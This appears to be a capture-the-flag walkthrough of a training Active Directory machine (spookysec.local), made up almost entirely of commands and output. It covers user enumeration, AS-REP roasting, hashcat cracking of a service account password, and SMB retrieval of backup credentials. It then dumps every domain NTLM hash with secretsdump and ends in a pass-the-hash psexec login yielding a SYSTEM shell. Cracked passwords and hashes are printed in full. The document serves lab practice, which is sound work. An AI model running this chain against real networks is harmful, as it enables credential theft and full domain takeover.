## ENUM4LINUX
```bash
sudo enum4linux -a $ip | tee scan/enum4linux_output.txt

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group) 
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)


[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)
```
## KERBRUTE
```bash
sudo ./kerbrute userenum -d spookysec.local ./userlist.txt --dc $ip 
2025/04/23 18:56:31 >  [+] VALID USERNAME:       james@spookysec.local
2025/04/23 18:56:38 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/04/23 18:56:45 >  [+] VALID USERNAME:       James@spookysec.local
2025/04/23 18:56:48 >  [+] VALID USERNAME:       robin@spookysec.local
2025/04/23 18:57:18 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/04/23 18:57:37 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/04/23 18:58:15 >  [+] VALID USERNAME:       backup@spookysec.local
2025/04/23 18:58:33 >  [+] VALID USERNAME:       paradox@spookysec.local
```
## IMPACKET-GETNPUSERS (TGT ASREP ROASTING)
```bash
sudo impacket-GetNPUsers spookysec.local/svc-admin -dc-ip 10.10.11.119 -no-pass 
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:1ada03e55a33ee90060cd81b9be23ad2$b4cee78c442b99cd0c452c9f807d3c06eae7a8e4bb61fd9c934148097a9d8c4ff402cefd1404844c2acfeb043c2606a799d9bfafb516ff2785d7
915921aba65a1d71b38fd1fd27e6d5e829669f5cec1c27f2c7103b189dfdbebbb6cfc71e91f000747f17de34316f57298838a3214a99cdac921dcea44232721800067ceeb1696f4b67f12e79036ded9b128514f0cbbe53f53e9abe2b320a6
d935ebd63a2100fd9af1677f227b47c11eca778b0c4bf63628c34a09ffb6d21c7a9de1585d6ec46119a67e1462e22f9849f8dc8600d163f2acb56e42c1b6f7a1faf339dd42551dd12fc96a304cfa5cd282fb7a3f94df0b9ddfd 
```
## CRACKING THE HASH
```bash
sudo hashcat -m 18200 ./raw-asrep /usr/share/wordlists/rockyou.txt
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:ea6c03db691405461799035c47b33e93$cebb38c6c2f19e90335a130884f1a79341889e72d8de6ab15c416a91a972ea31cf8f3af6667f382730d7a454efd8b5ef6b62f41ac51c5941a29f
98ed49fe08862bf2ea1fe259892c2b48cd0d5b52169ee681d6483dd317d6ac757befdab35f71a3166f2f9332670f8502e41189d71b35c43b3275ccb32b13f6314ef5bc8a8947511135febcc7bfa25177d9ac28e551968716aafdb8baf91e1
8cb068f8f980722a30591492f3efef5b3489ddb5ea222c253b34d931d5cb3c52c279df72c31d10b692bfc45ee9a8d0371972e45c93f035874d38743ef6e6626176a77254557efab701e7f8adc3060637875af58af38e4f98c2b:management2005
```
## CREDENTIALS I
```bash
svc-admin:management2005
```
## LIST SHARES WITH CREDS
```bash
sudo nxc smb $ip -u 'svc-admin' -p 'management2005' --shares                                                                                                                           
SMB         10.10.11.119    445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.11.119    445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005 
SMB         10.10.11.119    445    ATTACKTIVEDIREC  [*] Enumerated shares                                                                           
SMB         10.10.11.119    445    ATTACKTIVEDIREC  Share           Permissions     Remark  
SMB         10.10.11.119    445    ATTACKTIVEDIREC  -----           -----------     ------                                                          
SMB         10.10.11.119    445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin                                                    
SMB         10.10.11.119    445    ATTACKTIVEDIREC  backup          READ                    
SMB         10.10.11.119    445    ATTACKTIVEDIREC  C$                              Default share                                                   
SMB         10.10.11.119    445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.10.11.119    445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share     
SMB         10.10.11.119    445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share 
```
## ENUMERATING SHARES
```bash
sudo smbclient //$ip/backup -U svc-admin%management2005                                    
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr  5 00:38:39 2020
  ..                                  D        0  Sun Apr  5 00:38:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 00:38:53 2020

8247551 blocks of size 4096. 4032598 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> quit
```
## CREDS II
```bash
less backup_credentials.txt | base64 -d 

backup@spookysec.local:backup2517860
```
## DUMPING HASHES DRSUAPI METHOD - IMPACKET-SECRETSDUMP
```bash
sudo impacket-secretsdump spookysec.local/backup@$ip
Password:backup2517860

Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:8f6bee527a0de632cc2516b6049d6ecf:::
```
## ADMINISTRATOR LOGIN USING IMPACKET-PSEXEC
```bash
sudo impacket-psexec administrator@$ip -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
[*] Requesting shares on 10.10.11.119.....                                                    
[*] Found writable share ADMIN$           
[*] Uploading file gduJTGUE.exe                                                                                                                                                              
[*] Opening SVCManager on 10.10.11.119.....
[*] Creating service siCV on 10.10.11.119.....
[*] Starting service siCV.....                                                                
[!] Press help for extra shell commands       
Microsoft Windows [Version 10.0.17763.1490]                                                   
(c) 2018 Microsoft Corporation. All rights reserved.          

C:\Windows\system32> whoami                                                                   
nt authority\system                  
```
## NMAP SCAN OUTPUTS
```bash
sudo nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 2>/dev/null -oN nmap/scan-script-version $ip

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-23 12:13:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-04-23T12:14:38+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-04-23T12:14:28+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-22T10:39:37
| Not valid after:  2025-10-22T10:39:37
| MD5:   f8c2:640e:992f:da68:74bd:e908:c0da:6f13
|_SHA-1: 926f:a35c:8b91:c529:72a2:1a68:85f1:78c9:124b:9f61
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49827/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-23T12:14:30
|_  start_date: N/A
```
